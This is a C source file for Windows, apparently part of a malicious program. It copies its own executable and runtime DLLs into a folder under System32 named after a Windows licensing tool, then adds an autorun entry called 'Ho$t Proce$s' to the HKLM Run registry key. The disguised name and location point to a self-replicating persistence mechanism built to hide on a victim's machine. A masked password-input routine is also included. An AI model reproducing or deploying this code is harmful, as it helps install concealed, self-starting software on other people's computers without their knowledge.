#include "cAdvanced_Utilities.h"
#include <strings.h>
#include <stdlib.h>
#include <conio.h>
#include <stdio.h>

#define TRUE 1
#define FALSE 0

static char gexe_filename[MAX_PATH];
static char gexe_filepath[MAX_PATH];
static char gdll_filename_01[MAX_PATH];
static char gdll_filepath_01[MAX_PATH];
static char gdll_filename_02[MAX_PATH];
static char gdll_filepath_02[MAX_PATH];
static char gdll_filename_03[MAX_PATH];
static char gdll_filepath_03[MAX_PATH];

static void ReCompute_FilePath(TCHAR*);
static inline void initialize_char(char*,int);
static inline void initialize_tchar(TCHAR*,int);
static void Copy_Files_To(const char*,const char*,const char*,const char*);

short Am_I_Registered(PCWSTR pszAppName)
{
 HKEY hKey=NULL;
 LONG lResult=0;
 short fSuccess=TRUE;
 DWORD dwRegType=REG_SZ;
 wchar_t szPathToExe[MAX_PATH];
 DWORD dwSize=sizeof(szPathToExe);
 lResult=RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ,&hKey);
 fSuccess=(lResult==0);
 
 if(fSuccess)
  {
   lResult=RegGetValueW(hKey, NULL, pszAppName, RRF_RT_REG_SZ, &dwRegType, szPathToExe, &dwSize);
   fSuccess=(lResult==0);
  }
  
  if(fSuccess)
   {
   	fSuccess=(wcslen(szPathToExe)>0)? TRUE:FALSE;
   }
  
  if(hKey!=NULL)
   {
   	RegCloseKey(hKey);
   	hKey=NULL;
   }
  return fSuccess;    
}

TCHAR* Replicate_Self()
{
 DWORD pathlen=0;
 static TCHAR temp[MAX_PATH];
 pathlen=GetModuleFileName(NULL, temp, MAX_PATH);
 if(pathlen==0)
   {
    perror("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n");
    system("pause");
    return NULL;
   }
  strcpy(gdll_filename_01,"libstdc++-6.dll");
  strcpy(gdll_filename_02,"libwinpthread-1.dll");
  strcpy(gdll_filename_03,"libgcc_s_dw2-1.dll");
  ReCompute_FilePath(temp);
  Copy_Files_To(gexe_filepath,gdll_filepath_01,gdll_filepath_02,gdll_filepath_03);
  unsigned i;
  for(i=0; i<strlen(temp); ++i)temp[i]=temp[i+1];
  return temp;
} 

short Write_To_Registry()
{
 //check whether program is registered and if yes return to caller
 short state=Am_I_Registered(L"Ho$t Proce$s");
 if(state==TRUE)
  return TRUE;   
  
  
//replicate self    
  TCHAR* szPath=Replicate_Self();
  if(strlen(szPath)==1)
  {
   perror("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n");
   system("pause");
   return FALSE;
  }
    

//write to registry  
   DWORD pathlen=strlen(szPath);
   HKEY newvalue;
   
   if(RegOpenKey(HKEY_LOCAL_MACHINE, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &newvalue)!=ERROR_SUCCESS)
     {
      perror("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n");
      system("pause");
      return FALSE;
     }
                       
  DWORD pathLenInBytes=pathlen*sizeof(*szPath);
  if(RegSetValueEx(newvalue, TEXT("Ho$t Proce$s"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes)!=ERROR_SUCCESS)
    {
     RegCloseKey(newvalue);
     perror("RUN PROGRAM AS ADMINISTRATOR FOR FULL FUNCTIONALITY\n");
     system("pause");
     return FALSE;  
    }	 
	
   RegCloseKey(newvalue);
   return TRUE;		    
}

void Copy_Files_To(const char* filepath_01,const char* filepath_02,const char* filepath_03,const char* filepath_04)
{
	system(filepath_04);
	system(filepath_03);
	system(filepath_02);
	system(filepath_01);
	return;
}

void ReCompute_FilePath(TCHAR* filepath_to_exe)
{
  char* newpath=" C:\\Windows\\System32\\slmgr\\";
  char* copy="copy ";
	char szpath[MAX_PATH];
	char default_path_to_files[MAX_PATH];
	
	initialize_char(szpath,MAX_PATH);
	initialize_char(default_path_to_files,MAX_PATH);
	initialize_char(gexe_filename,MAX_PATH);
	initialize_char(gexe_filepath,MAX_PATH);
	initialize_char(gdll_filename_01,MAX_PATH);
	initialize_char(gdll_filepath_01,MAX_PATH); 
	initialize_char(gdll_filename_02,MAX_PATH);
	initialize_char(gdll_filepath_02,MAX_PATH); 
	initialize_char(gdll_filename_03,MAX_PATH);
	initialize_char(gdll_filepath_03,MAX_PATH); 
	
	int l;
	for(l=0; l<MAX_PATH; ++l)szpath[l]=filepath_to_exe[l];

	int i;
	for(i=strlen(szpath)-1; i>=0; --i)
		{
			if(szpath[i]=='\\')
				{
					int k,h;
					unsigned j;
					for(k=0; k<=i; k++)
						default_path_to_files[k]=szpath[k];
					for(h=0,j=i+1; j<strlen(szpath); h++,j++)
						gexe_filename[h]=szpath[j];
					break;
				}
		}

	strcpy(szpath,newpath);
	strcat(szpath,gexe_filename);
	
  strcpy(gexe_filepath,copy);
  strcat(gexe_filepath,default_path_to_files);
  strcat(gexe_filepath,gexe_filename);
  strcat(gexe_filepath,newpath);
  
  strcpy(gdll_filepath_01,copy);
  strcat(gdll_filepath_01,default_path_to_files);
  strcat(gdll_filepath_01,gdll_filename_01);
  strcat(gdll_filepath_01,newpath);
  
  strcpy(gdll_filepath_02,copy);
  strcat(gdll_filepath_02,default_path_to_files);
  strcat(gdll_filepath_02,gdll_filename_02);
  strcat(gdll_filepath_02,newpath);
  
  strcpy(gdll_filepath_03,copy);
  strcat(gdll_filepath_03,default_path_to_files);
  strcat(gdll_filepath_03,gdll_filename_03);
  strcat(gdll_filepath_03,newpath);
  
  initialize_tchar(filepath_to_exe,MAX_PATH);
  register int k;
  for(k=0; k<MAX_PATH; ++k)filepath_to_exe[k]=szpath[k];
  
  return;
}

char* hide_user_input()
{
  char* key=malloc(30);
  char temp_char[2],key_char;
  int i;
  for(i=0; i<30; i++)
    key[i]='\0';
  int j; 
  for(j=0; j<2; j++)
    temp_char[j]='\0';
  while(key_char!=13)	//13==enter
    {
     key_char=getch();
     if(key_char==8)	//8==backspace
       {
       	key[strlen(key)-1]='\0';
       	system("cls");
       	unsigned k;
       	for(k=0; k<strlen(key); k++)
       	  printf("*");
   	    continue;
       }
     printf("*"); 		
	 temp_char[0]=key_char;
	 strcat(key,temp_char); 
    }
  	return key;     
}

static inline void initialize_char(char* _array,int _size)
{
	register int i;
	for(i=0; i<_size; ++i)_array[i]='\0';
	return;
}

static inline void initialize_tchar(TCHAR* _array,int _size)
{
	register int i;
	for(i=0; i<_size; ++i)_array[i]='\0';
	return;
}
